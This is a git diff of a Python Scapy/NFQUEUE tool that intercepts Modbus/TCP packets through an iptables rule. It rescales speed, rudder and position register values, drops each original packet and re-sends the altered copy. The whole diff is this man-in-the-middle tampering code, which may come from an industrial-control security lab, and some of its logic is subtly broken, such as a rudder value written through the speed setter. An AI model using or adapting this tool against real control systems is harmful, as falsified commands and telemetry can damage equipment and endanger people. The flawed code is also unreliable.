@@ -92,7 +92,7 @@ class mb:
         pl = getattr(mbl, "payload", "?")
         return getattr(pl, "registerValue", "?")
 
-    def set_coords(pkt, new):
+    def set_coord(pkt, new):
         if not mb.is_coord(pkt):
             return False
         mbl = pkt.getlayer(ModbusADURequest)
@@ -226,10 +226,32 @@ class mb:
 class config:
     put_all: bool = False
     do_mods = False
-    mod_matrix = [[1.0,0.0], [1.0,0.0], [1.0,0.0], [1.0,0.0], [1.0,0.0]]
+    xm = 1
+    ym = 1
+    tm = 1
+    sm = 1
+    rm = 1
+    xo = 0
+    yo = 0
+    to = 0
+    so = 0
+    ro = 0
+    def to_string():
+        return f"Mods\tx\ty\tt\ts\tr\nmult:\t{config.xm}\t{config.ym}\t{config.tm}\t{config.sm}\t{config.rm}\noffset:\t{config.xo}\t{config.yo}\t{config.to}\t{config.so}\t{config.ro}"
     queue_size: int = 500
     put_real: bool = True
     put_fake: bool = True
+    def reset():
+        config.xm = 1
+        config.ym = 1
+        config.tm = 1
+        config.sm = 1
+        config.rm = 1
+        config.xo = 0
+        config.yo = 0
+        config.to = 0
+        config.so = 0
+        config.ro = 0
 
 # Queues the packets for the GUI to poll
 class buffer:
@@ -241,7 +263,7 @@ class buffer:
         try:
             return buffer.packet_queue.get_nowait()
         except:
-            return None
+            return 
 
     # What does the GUI need?
     '''
@@ -301,7 +323,8 @@ class buffer:
             buffer.packet_queue.put_nowait(p)
             return True
         except:
-            print("Buffer full")
+            # print("Buffer full")
+            buffer.clear()
             return False
 
     def clear():
@@ -357,40 +380,44 @@ class net_filter_queue:
         net_filter_queue.stop_event.set()
         net_filter_queue.process.join(timeout=2)
 
-    def packet_listener(packet):
+    def packet_listener(nfq_pkt):
+        mod = False
     
-        pl=IP(packet.get_payload())
+        pkt=IP(nfq_pkt.get_payload())
 
-        #print('source IP:',pl[IP].src)
-        #print('Destination IP', pl[IP].dst)
-        #print('raw:',bytes(pl))
+        mb.print_scannable(pkt, show_transId=True)
 
-                    
-        if mb.is_commands(pl):
-            
-            pl = mb.set_speed(pl, 0)
+        # Modify values 
+        if mod:
+            if mb.is_commands(pkt):
+                buffer.put(pkt, "Incoming")
+                pkt = mb.set_speed(pkt, mb.get_speed(pkt)*config.sm + config.so)
+                pkt = mb.set_speed(pkt, mb.get_rudder(pkt)*config.rm + config.ro)
+            elif mb.is_coord(pkt):
+                buffer.put(pkt, "Incoming")
+                if mb.is_x(pkt):
+                    pkt = mb.set_coord(pkt, mb.get_coord(pkt)*config.xm + config.xo)
+                elif mb.is_y(pkt):
+                    pkt = mb.set_coord(pkt, mb.get_coord(pkt)*config.ym + config.yo)
+                elif mb.is_theta(pkt):
+                    pkt = mb.set_coord(pkt, mb.get_coord(pkt)*config.tm + config.to)
+                buffer.put(pkt,"Outgoing")
+        
+        mb.print_scannable(pkt, show_transId=False)
+                
 
-        if mb.is_modbus(pl):
-
-            mb.print_scannable(pl, show_transId=True, convert=True)
-
-        del pl[TCP].chksum
-        del pl[IP].chksum
+        del pkt[TCP].chksum
+        del pkt[IP].chksum
         # packet.set_payload(bytes(pl))
 
-        #     #packet.drop()
-        #     pl.show() 
-            
-      
-        
-        #pl.show()  
-        packet.set_payload(bytes(pl))
-        packet.accept()
+        # packet.set_payload(bytes(pl))
 
-        '''
-        packet.drop()
-        scapy.send(pl)
-        '''            
+
+        nfq_pkt.drop()
+        scapy.send(pkt)
+
+
+                    
 
     def __setdown():
         os.system("sudo iptables -t mangle -D PREROUTING -i wlp0s20f3 -p TCP -j NFQUEUE --queue-num 1") 
@@ -431,7 +458,7 @@ class scapy_sniffing:
         def handle_packet(pkt):
             # Modbus/TCP runs over TCP port 502
             if pkt.haslayer(TCP) and (pkt[TCP].sport == 502 or pkt[TCP].dport == 502):
-                if mb.is_modbus(pkt):
+                if mb.is_coord(pkt) or mb.is_commands(pkt):
                     if print_console:
                         mb.print_scannable(pkt, convert=True)
                     if put_buffer:
@@ -605,5 +632,4 @@ def abort_all():
     buffer.clear()
     config.reset()
 
-    # NEXT make all these stop without needing to be started in the first place
     # NEXT why is nfq so slow? because it's interrupting traffic. why?
